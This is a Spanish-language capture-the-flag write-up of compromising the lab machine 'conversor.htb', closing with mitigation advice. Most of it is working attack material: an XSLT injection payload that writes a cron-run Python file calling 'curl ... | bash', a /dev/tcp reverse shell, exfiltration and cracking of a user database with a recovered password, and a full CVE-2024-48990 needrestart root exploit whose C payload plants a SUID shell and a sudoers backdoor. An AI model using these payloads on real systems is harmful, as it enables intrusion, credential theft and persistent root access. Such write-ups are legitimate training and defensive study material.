---
tags:
  - xml
  - XLST
  - EXSLT
  - needrestart
  - CVE-2024-48990
  - Python_Path_Hijacking
---
# Introduccion

El objetivo de esta máquina fue comprometer un servidor web vulnerable que implementaba un conversor XML/XSLT. Durante el proceso, se identificaron múltiples fallos de configuración y vulnerabilidades críticas que permitieron obtener ejecución remota de código, movimiento lateral y finalmente escalada de privilegios hasta root.

El flujo completo de compromiso incluye:

1. **Reconocimiento externo** → Identificación de servicios expuestos
2. **Explotación de XSLT Injection** → Escritura arbitraria de archivos
3. **Abuso de cron job inseguro** → Ejecución automática de payload
4. **Acceso inicial como www-data**
5. **Exfiltración de base de datos y crackeo de contraseñas**
6. **Acceso persistente vía SSH como usuario local**
7. **Escalada de privilegios mediante CVE-2024-48990 (needrestart)**
8. **Obtención de privilegios root**

La máquina combina fallos reales que suelen encontrarse en entornos empresariales mal configurados: malas prácticas de desarrollo, servicios automatizados inseguros y una escalada de privilegios moderna basada en vulnerabilidades recientes.
# Reconocimiento

Empiezo con un escaneo de nmap para intentar identificar los puertos y servicios que estan corriendo internamente en la direccion ip de la maquina victima

```bash
Nmap 7.95 scan initiated Sat Nov  1 10:05:56 2025 as: /usr/lib/nmap/nmap --privileged -sV -sC -p- --min-rate 3500 -Pn -oN nmap.txt conversor.htb
Warning: 10.10.11.92 giving up on port because retransmission cap hit (10).
Nmap scan report for conversor.htb (10.10.11.92)
Host is up (0.11s latency).
Scanned at 2025-11-01 10:05:57 EDT for 73s
Not shown: 63130 closed tcp ports (reset), 2403 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
| http-title: Login
|_Requested resource was /login
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read from /usr/share/nmap: nmap-protocols nmap-service-probes nmap-services.
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov  1 10:07:10 2025 -- 1 IP address (1 host up) scanned in 73.62 seconds
```

Tenemos dos puertos abiertos corriendo diferentes servicios `SSH:22 Apache:80` y nos intenta resolver a el dominio `conversor.htb` asi que mi siguiente paso fue agregar ese dominio a mi archivo `etc/hosts`

# Exploitation

Mi siguiente paso fue dirigirme a el servidor web de la maquina victima para intentar identificar posibles vulnerabilidades web que pueda explotar para tener accesso a la maquina

![[Pasted image 20251101100631.png]]

al entrar a la url me redirecciona al directorio `/login` pero al ver que me puedo crear una cuenta pues me creo una.

Ya una vez logueado tenemos lo siguiente

![[Pasted image 20251101100748.png]]

El servidor web nos permite subir archivos `XML` y `XSLT` 

# XLST Injection 

## Analisis del codigo fuente

Navegando por la aplicación web, descubrí un archivo comprimido disponible públicamente en `http://conversor.htb/static/source_code.tar.gz`. Después de descargarlo y extraer su contenido, procedí a realizar un análisis exhaustivo del código buscando posibles vectores de ataque.

## Descubrimiento Crítico: Tarea Automatizada

Dentro del archivo `install.md` encontré una configuración que inmediatamente llamó mi atención:

```bash
If you want to run Python scripts (for example, our server deletes all files old...)
***** www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f" ""
```

Este fragmento describe un **cron job** que se ejecuta automáticamente en el servidor. Analicemos su comportamiento:

- **Frecuencia de ejecución:** Los cinco asteriscos (`*****`) indican que la tarea se ejecuta cada minuto sin interrupción
- **Usuario:** Se ejecuta bajo el contexto del usuario `www-data` (típicamente el usuario del servidor web)
- **Acción:** Busca recursivamente cualquier archivo Python (`.py`) dentro de `/var/www/conversor.htb/scripts/` y lo ejecuta

### Implicación para la Seguridad

Esta configuración es **extremadamente peligrosa**. Si un atacante logra colocar un archivo Python malicioso en ese directorio, el sistema lo ejecutará automáticamente dentro de los próximos 60 segundos, sin ningún tipo de validación o restricción.

**Objetivo identificado:** Necesitamos encontrar una forma de escribir un archivo `.py` en `/var/www/conversor.htb/scripts/`.
## Identificando el Vector de Ataque

Examinando el código de la aplicación web (`app.py`), encontramos un endpoint interesante en `/convert`:

```python
def convert():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    xml_file = request.files['xml_file']
    xslt_file = request.files['xslt_file']
    from lxml import etree
    xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
    xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
    xml_file.save(xml_path)
    xslt_file.save(xslt_path)
    try:
        parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
        xml_tree = etree.parse(xml_path, parser)
        xslt_tree = etree.parse(xslt_path)
        transform = etree.XSLT(xslt_tree)
        result_tree = transform(xml_tree)
        result_html = str(result_tree)
        file_id = str(uuid.uuid4())
        filename = f"{file_id}.html"
        html_path = os.path.join(UPLOAD_FOLDER, filename)
        with open(html_path, "w") as f:
            f.write(result_html)
        conn = get_db()
        conn.execute("INSERT INTO files (id,user_id,filename) VALUES (?,?,?)", (file_id, session['user_id'], filename))
        conn.commit()
        conn.close()
        return redirect(url_for('index'))
    except Exception as e:
        return f"Error: {e}"
```

### ¿Qué Hace Esta Función?

La función `convert()` implementa un conversor XML-to-HTML usando transformaciones XSLT:

1. **Verifica autenticación:** Comprueba que el usuario tenga una sesión activa
2. **Recibe dos archivos:** Un documento XML y una hoja de estilos XSLT
3. **Los guarda temporalmente** en el directorio de uploads
4. **Procesa el XML:** Nota que el parser XML tiene protecciones (sin entidades externas, sin red, sin DTD)
5. **Procesa el XSLT:** Aquí está el problema - **no hay protecciones para el archivo XSLT**
6. **Ejecuta la transformación:** Aplica el XSLT sobre el XML
7. **Guarda el resultado:** Almacena el HTML generado

### La Falla de Seguridad

Observa la diferencia en el tratamiento de los archivos:

```python
# XML: Parser con múltiples protecciones
parser = etree.XMLParser(resolve_entities=False, no_network=True, 
                         dtd_validation=False, load_dtd=False)
xml_tree = etree.parse(xml_path, parser)

# XSLT: Sin ninguna protección
xslt_tree = etree.parse(xslt_path)  # ← Vulnerable
```

El archivo XSLT se procesa **sin restricciones de seguridad**, lo que nos permite inyectar código malicioso a través de él.
## Entendiendo la Vulnerabilidad: XSLT Injection

### ¿Qué es XSLT?

XSLT es más que un simple formato de transformación - es un **lenguaje de programación completo** disfrazado de XML. Permite no solo transformar datos, sino que tambien nos permite realizar operaciones complejas.

- Realizar operaciones lógicas (if, choose, for-each)
- Manipular cadenas y números
- Llamar funciones externas
- Y crucialmente: **interactuar con el sistema de archivos**

### El Componente Vulnerable: EXSLT Extensions

La implementación de `lxml` utiliza la biblioteca `libxml2`, que incluye soporte para **EXSLT** (Extended XSLT). EXSLT añade funcionalidades adicionales que no están en el estándar básico de XSLT.

Una de estas extensiones es el **namespace `exslt:common`**, que proporciona el elemento `<exsl:document>`.
### El Elemento `<exsl:document>`

Este elemento fue diseñado legítimamente para casos donde una transformación XSLT necesita generar múltiples archivos de salida. Por ejemplo, dividir un libro XML en múltiples páginas HTML.

```xml
<exsl:document href="ruta/archivo.html">
    <!-- Contenido a escribir -->
</exsl:document>
```

### La Vulnerabilidad

El problema está en el atributo `href`:

-  **Acepta rutas absolutas:** Podemos especificar `/var/www/conversor.htb/scripts/shell.py`
-  **Sin validación:** No hay sanitización de la ruta
-  **Permisos heredados:** La escritura se hace con los permisos de `www-data`
-  **Contenido arbitrario:** Podemos escribir cualquier contenido dentro del elemento

Esto nos da una **primitiva de escritura de archivos arbitraria**.

## Cadena de Explotación Completa

1. **Punto de entrada:** Endpoint `/convert` que procesa XSLT controlado por el atacante
2. **Primitiva de escritura:** `<exsl:document>` nos permite escribir archivos arbitrarios 
3. **Destino:** Directorio `/var/www/conversor.htb/scripts/` (escribible por `www-data`) 
4. **Trigger automático:** Cron job que ejecuta cualquier `.py` cada minuto 
5. **Resultado:** Shell reversa o backdoor ejecutándose como `www-data`


# Explotación: Obteniendo Shell como www-data

Con la vulnerabilidad identificada, procedí a construir el exploit para obtener acceso al servidor.

## Preparación del Entorno de Ataque

### 1. Creando el Script de Reverse Shell

Primero, preparé un script bash simple que establecería la conexión reversa:

```bash
sh -i >& /dev/tcp/10.10.16.26/8555 0>&1
```

### Crafting del Payload XSLT

Creé el archivo `josu.xlst` con el siguiente contenido:

```xml
┌──(zikuta㉿kali)-[~]
└─$ cat josu.xlst
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
    version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:exsl="http://exslt.org/common"
    extension-element-prefixes="exsl">
    <xsl:template match="/">
        <exsl:document href="/var/www/conversor.htb/scripts/shell.py" method="text"><![CDATA[
import os
os.system("curl http://10.10.16.26:8081/shell.sh | bash")
]]></exsl:document>
    </xsl:template>
</xsl:stylesheet>
```

**Desglose del payload:**

- `xmlns:exsl="http://exslt.org/common"`: Declara el namespace EXSLT que nos da acceso a funciones extendidas
- `extension-element-prefixes="exsl"`: Habilita el uso de elementos del namespace EXSLT
- `<xsl:template match="/">`: Coincide con el nodo raíz del XML (se ejecutará siempre)
- `<exsl:document href="/var/www/conversor.htb/scripts/shell.py">`: Aquí está la magia - escribe en la ruta absoluta especificada
- `method="text"`: Indica que el contenido debe escribirse como texto plano (no XML)
- `<![CDATA[...]]>`: Permite escribir código Python sin que los caracteres especiales interfieran con el XML

El código Python resultante:

```python
import os
os.system("curl http://10.10.16.26:8081/shell.sh | bash")
```

Este código:

1. Descarga el script `shell.sh` desde mi servidor HTTP
2. Lo pasa directamente a `bash` mediante un pipe
3. Bash ejecuta la reverse shell

### Levantando el Servidor HTTP

Para servir el script `shell.sh`, inicié un servidor HTTP simple en el puerto 8081:

```bash
┌──(zikuta㉿kali)-[~]
└─$ python3 -m http.server 8081 
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
```

## Configuración de Listeners

### 4. Listener para la Reverse Shell

En otra terminal, configuré un listener con la herramienta `penelope` esperando la conexión en el puerto `8555`:

```bash
┌──(zikuta㉿kali)-[~]
└─$ penelope -p 8555
[+] Listening for reverse shells on 0.0.0.0:8555 →  127.0.0.1 • 172.17.0.1 • 10.10.14.105
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from conversor~10.10.11.92-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/zikuta/.penelope/sessions/conversor~10.10.11.92-Linux-x86_64/2025_11_02-08_41_02-416.log 📜
```

Tenemos una reverse shell como el usuario `www-data`
## Enumeración del Sistema

Con acceso como `www-data`, comencé la fase de enumeración post-explotación para identificar posibles vías de escalada de privilegios o movimiento lateral.

Revisé el archivo `/etc/passwd` para identificar usuarios con shell interactiva y logre identificar un usuario llamado `fismathack`

**Usuario objetivo identificado:** `fismathack` (UID 1000, usuario estándar del sistema)

## Extracción de la Base de Datos

Recordando el análisis del código fuente, sabía que la aplicación utilizaba SQLite para almacenar información de usuarios. Decidí buscar esta base de datos.

```bash
www-data@conversor:~/conversor.htb$ cd instance
www-data@conversor:~/conversor.htb/instance$ ls
users.db
```
**Archivo encontrado:** `users.db` - Base de datos SQLite que probablemente contiene credenciales

### Exfiltrando la Base de Datos

Para analizar la base de datos con más comodidad, decidí transferirla a mi máquina atacante. Levanté un servidor HTTP en la máquina víctima:

```bash
www-data@conversor:~/conversor.htb/instance$ python3 -m http.server 9001
Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
10.10.14.105 - - [02/Nov/2025 13:42:24] "GET / HTTP/1.1" 200 -
10.10.14.105 - - [02/Nov/2025 13:42:24] code 404, message File not found
10.10.14.105 - - [02/Nov/2025 13:42:24] "GET /favicon.ico HTTP/1.1" 404 -
10.10.14.105 - - [02/Nov/2025 13:42:26] "GET /users.db HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
www-data@conversor:~/conversor.htb/instance$ 
```

Despues en mi maquina lo abri con sqlite para explorar la base de datos y me encontre con todas las contrasenas de los usuarios en formato `hash MD5`

![[Pasted image 20251102084639.png]]

### John

Procedo a intentar `crackear` la contrasena del usuario `fismathack` con la herramienta `john the ripper`

![[Pasted image 20251102084755.png]]

	fismathack:Keepmesafeandwarm


## Acceso Legítimo via SSH

Recordando el escaneo inicial con Nmap, sabía que el puerto 22 (SSH) estaba abierto. Con credenciales válidas, procedí a conectarme:

```bash
Last login: Sun Nov 2 13:49:25 2025 from 10.10.14.105
fismathack@conversor:~$ ls
user.txt
```

Y obtuve la primera flag!!

## Enumeración de Privilegios Sudo

Una vez dentro del sistema como `fismathack`, lo primero que hice fue verificar qué comandos podía ejecutar con privilegios elevados:

```bash
fismathack@conversor:~$ sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

### Análisis del Resultado

**Hallazgo crítico:** El usuario `fismathack` puede ejecutar `/usr/sbin/needrestart` como root sin necesidad de contraseña.

Desglosemos los permisos:

- `(ALL : ALL)`: Podemos ejecutar el comando como cualquier usuario y grupo, incluyendo root
- `NOPASSWD`: No se requiere ingresar contraseña
- `/usr/sbin/needrestart`: Es el único binario que podemos ejecutar con estos privilegios

## Investigando needrestart

### ¿Qué es needrestart?

`needrestart` es una herramienta de administración de sistemas Linux que:

- Escanea todos los procesos en ejecución
- Identifica servicios que están usando bibliotecas desactualizadas
- Determina qué servicios necesitan ser reiniciados después de una actualización del sistema

Es común en sistemas Ubuntu/Debian y **típicamente se ejecuta con privilegios de root** para poder inspeccionar todos los procesos del sistema.

**Verificando version instalada**

```bash
fismathack@conversor:~$ /usr/sbin/needrestart -v
[main] needrestart v3.7
[main] eval /etc/needrestart/needrestart.conf
[main] Using UI 'NeedRestart::UI::stdio'
```

**Versión vulnerable**: needrestart 3.7 - susceptible a CVE-2024-48990.

# **Privilege Escalation via CVE-2024-48990** 

**Vulnerabilidad**: CVE-2024-48990 - PYTHONPATH Hijacking en needrestart  
**Severidad**: Alto (7.8 CVSS)  
**Impacto**: Escalada de privilegios de usuario normal a root  
**Binario afectado**: `/usr/sbin/needrestart` v3.7

## Entendiendo la Vulnerabilidad:

CVE-2024-48990 Esta vulnerabilidad es un ejemplo perfecto de cómo características legítimas pueden convertirse en vectores de ataque cuando no se validan correctamente las entradas del usuario.

### El Problema en Lenguaje Simple 

Imagina esta situación: 

1. **Tú** (como usuario normal) inicias un programa Python 
2. Antes de iniciarlo, configuras una variable de entorno llamada `PYTHONPATH` que le dice a Python: "busca módulos primero en esta carpeta que yo controlo"
3. Tu programa Python se queda ejecutando en segundo plano 
4. Luego ejecutas `sudo needrestart` (como root)
5. `needrestart` ve tu programa Python y piensa: "necesito inspeccionarlo para ver qué bibliotecas usa"
6. Para inspeccionar un programa Python, `needrestart` necesita **ejecutar código Python él mismo** 
7. **Aquí está el fallo:** Cuando `needrestart` (que ahora es root) ejecuta Python para inspeccionar tu proceso, **hereda tu PYTHONPATH malicioso**
8. Cuando intenta importar módulos Python estándar como `importlib`, Python busca primero en tu carpeta maliciosa 
9. Tú has colocado un módulo falso en esa carpeta con código malicioso
10. Python (ejecutando como root) carga y ejecuta tu código malicioso


# Escalada de Privilegios CVE-2024-48990 NeedRestart

## **¿Por qué needrestart es vulnerable?**

El programa _needrestart_, al ejecutarse como root vía sudo, analiza todos los procesos del sistema para detectar bibliotecas desactualizadas.

Cuando encuentra un proceso de Python, intenta inspeccionar su entorno **importando módulos de Python**, como `importlib`.

El problema:

> needrestart **hereda las variables de entorno del proceso analizado**, incluyendo **PYTHONPATH**.

Esto significa que:

- Si el proceso que needrestart inspecciona está ejecutándose con un **PYTHONPATH modificado por un atacante**,
- entonces **needrestart (root)** usará ese PYTHONPATH,
- y Python cargará **módulos maliciosos** creados por el atacante,
- ejecutando código arbitrario **como root**.

Este es el núcleo del exploit.

# **Construcción del payload malicioso (`__init__.so`)**

Primero creamos un archivo en C (**lib.c**) que actuará como el módulo malicioso que Python cargará con permisos de root:

```c++
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

/* This is a GCC attribute that marks 'a()' as a constructor. */
/* This function will run AUTOMATICALLY when the library is loaded. */
static void a() __attribute__((constructor));

void a() {
    /* Only run if we are root */
    if(geteuid() == 0) { 
        setuid(0);
        setgid(0);
        
        /* The payload:
           1. Copy the bash shell to /tmp/poc
           2. Make /tmp/poc a SUID binary (owned by root, runs as root)
           3. Add a sudoers rule as a backup persistence method
        */
        const char *shell = "cp /bin/sh /tmp/poc; "
                            "chmod u+s /tmp/poc; "
                            "grep -qxF 'ALL ALL=(ALL) NOPASSWD: /tmp/poc' /etc/sudoers || "
                            "echo 'ALL ALL=(ALL) NOPASSWD: /tmp/poc' >> /etc/sudoers";
        system(shell);
    }
}
```

Este payload hace tres cosas al cargarse como root:

1. Copia `/bin/sh` a `/tmp/poc`
2. Le establece el bit SUID → shell de root
3. Añade una regla a `/etc/sudoers` que permite ejecutar `/tmp/poc` sin contraseña

Luego lo compilamos como una librería compartida de Python:

```bash
gcc -shared -fPIC -o __init__.so lib.c  
```

Este archivo (`__init__.so`) será el módulo malicioso que Python cargará.

# **Preparación del ataque en la máquina víctima**

Creamos un script en Bash que automatiza toda la explotación:

```bash
#!/bin/bash
set -e
cd /tmp

# 1. Create the malicious module directory structure
mkdir -p malicious/importlib

# 2. Download our compiled C payload from our attacker server
#    (Replace 10.10.14.81 with your attacker IP)
curl http://10.10.15.237:8080/__init__.so -o /tmp/malicious/importlib/__init__.so

# 3. Create the "bait" Python script (e.py)
#    This script just loops, waiting for the exploit to work
cat << 'EOF' > /tmp/malicious/e.py
import time
import os

while True:
    try:
        import importlib
    except:
        pass
    
    # When our C payload runs, it creates /tmp/poc
    # This loop waits for that file to exist
    if os.path.exists("/tmp/poc"):
        print("Got shell!, delete traces in /tmp/poc, /tmp/malicious")
        # The C payload also added a sudoers rule.
        # We use that rule to pop our root shell.
        os.system("sudo /tmp/poc -p")
        break
    time.sleep(1)
EOF

# 4. This is the magic!
#    Run the bait script (e.py) with the PYTHONPATH hijacked.
#    This process will just sit here, waiting for needrestart to scan it.
echo "Bait process is running. Trigger 'sudo /usr/sbin/needrestart' in another shell."
cd /tmp/malicious; PYTHONPATH="$PWD" python3 e.py 2>/dev/null
```

**¿Qué hace este script?**

Crea una estructura de módulo falsa:

```bash
/tmp/malicious/importlib/__init__.so
```
de forma que Python piense que nuestro archivo es el módulo legítimo `importlib`.

2. **Descarga la librería maliciosa** compilada en nuestra máquina atacante.
3. **Ejecuta un script en Python (`e.py`) con un PYTHONPATH controlado por nosotros.**

Este proceso se queda activo, esperando a que needrestart lo analice.

4. Cuando needrestart escanee este proceso (porque el usuario lo ejecutará luego con sudo), heredará el entorno de `e.py`.
5. Al intentar importar `importlib`, Python cargará **nuestro módulo malicioso**.
6. El payload se ejecutará **como root**, creando `/tmp/poc`.
7. `e.py` detecta que `/tmp/poc` existe → lanza una shell de root:

```bash
sudo /tmp/poc -p
```

# Ejecución final del exploit

Abrimos **otro terminal** y simplemente ejecutamos:

```bash
sudo /usr/sbin/needrestart
```

Cuando needrestart analiza el proceso Python del script, carga nuestro módulo malicioso y ejecuta el payload.

![[Pasted image 20251119111138.png]]

# Flujo del Ataque 

```kotlin
┌─────────────────────────────┐
│        Reconocimiento       │
│ Nmap → Puertos 22, 80       │
└──────────────┬──────────────┘
               │
               ▼
┌─────────────────────────────┐
│    Análisis de la WebApp    │
│ Subida de XML/XSLT          │
│ Descarga del source_code    │
└──────────────┬──────────────┘
               │
               ▼
┌─────────────────────────────┐
│     Descubrimiento clave    │
│ Cron job ejecuta .py cada   │
│ 1 minuto como www-data      │
└──────────────┬──────────────┘
               │
               ▼
┌──────────────────────────────┐
│     XSLT Injection           │
│ EXSLT <exsl:document> →      │
│ Escritura arbitraria de .py  │
│ en /var/www/.../scripts/     │
└───────────────┬──────────────┘
                │
                ▼
┌──────────────────────────────┐
│   Ejecución automática       │
│ Cron job ejecuta shell.py    │
│ Reverse shell como www-data  │
└───────────────┬──────────────┘
                │
                ▼
┌──────────────────────────────┐
│   Enumeración Interna        │
│ users.db → hashes MD5        │
│ Crackeo con John             │
└───────────────┬──────────────┘
                │
                ▼
┌──────────────────────────────┐
│      SSH con credenciales    │
│   Usuario: fismathack        │
└───────────────┬──────────────┘
                │
                ▼
┌──────────────────────────────┐
│  Escalada de Privilegios     │
│ CVE-2024-48990 Needrestart   │
│ Hijacking de PYTHONPATH      │
│ Carga de módulo malicioso    │
│ Ejecución como root          │
└───────────────┬──────────────┘
                │
                ▼
┌──────────────────────────────┐
│            ROOT              │
└──────────────────────────────┘
```

# **Mitigaciones**

Incluye esto en tu writeup porque demuestra entendimiento de seguridad real.

##  **1. Restringir el procesado XSLT**

- Deshabilitar EXSLT por completo en lxml
- Habilitar modo seguro:

```bash
etree.XSLT(xslt_tree, access_control=etree.XSLTAccessControl.DENY_ALL)
```

- Bloquear elementos peligrosos como `exsl:document`

##  **2. Nunca ejecutar archivos cargados por el usuario**

- El cron job es el fallo más grave  
    Solución:
    
    - No ejecutar scripts de un directorio escribible por www-data
    - Validar contenido antes de ejecutar cualquier script
    - Mover la ejecución a un usuario sin privilegios

## **Almacenar contraseñas con hashing seguro**

Evitar usar MD5. Usar:

- bcrypt
- argon2
- scrypt

## **4. Principio de mínimo privilegio**

- El directorio `scripts/` no debe ser escribible por www-data
- needrestart no debe ejecutarse vía sudo por usuarios no privilegiados

## **Parchear CVE-2024-48990**

Actualizar needrestart a una versión corregida:

```bash
apt update && apt install needrestart
```

## **Remover PYTHONPATH del entorno en procesos privilegiados**

En sudoers:

```bash
Defaults env_delete+=PYTHONPATH
```

# **Conclusión**

La máquina **conversor.htb** demuestra una cadena de ataque muy realista que combina malas configuraciones, vulnerabilidades del lado del servidor y errores de seguridad modernos. La explotación pivota desde un servicio web vulnerable hasta el compromiso total del sistema mediante un cron job mal diseñado y una escalada de privilegios basada en CVE-2024-48990.

Esta experiencia evidencia la importancia de:

- Implementar controles de seguridad en transformaciones XSLT
- No permitir que procesos automatizados ejecuten archivos sin validación
- Almacenar contraseñas de forma segura
- Actualizar continuamente herramientas del sistema
- Configurar correctamente sudo y las variables del entorno

El ataque refleja cómo múltiples fallos pequeños pueden encadenarse para producir una toma total del sistema.